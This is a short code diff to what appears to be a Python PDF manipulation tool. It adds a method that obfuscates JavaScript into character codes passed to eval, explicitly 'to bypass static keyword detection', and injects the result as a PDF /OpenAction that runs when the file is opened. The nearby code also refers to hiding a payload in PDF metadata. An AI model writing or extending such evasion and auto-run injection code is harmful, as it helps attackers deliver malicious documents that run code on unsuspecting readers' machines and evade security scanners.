@@ -37,6 +37,14 @@ class PDFHandler:
         # but could be expanded to actual stream objects.
         return self.update_metadata("/HiderPayload", data, output_path)
 
+    def inject_obfuscated_js(self, script, output_path=None):
+        """Injects obfuscated /OpenAction JavaScript using character codes."""
+        # Convert script to char codes to bypass static keyword detection
+        char_codes = [ord(c) for c in script]
+        obfuscated_script = f"eval(String.fromCharCode({','.join(map(str, char_codes))}));"
+        
+        return self.inject_open_action(obfuscated_script, output_path)
+
     def inject_open_action(self, script, output_path=None):
         """Injects a JavaScript /OpenAction into the PDF."""
         if output_path is None:
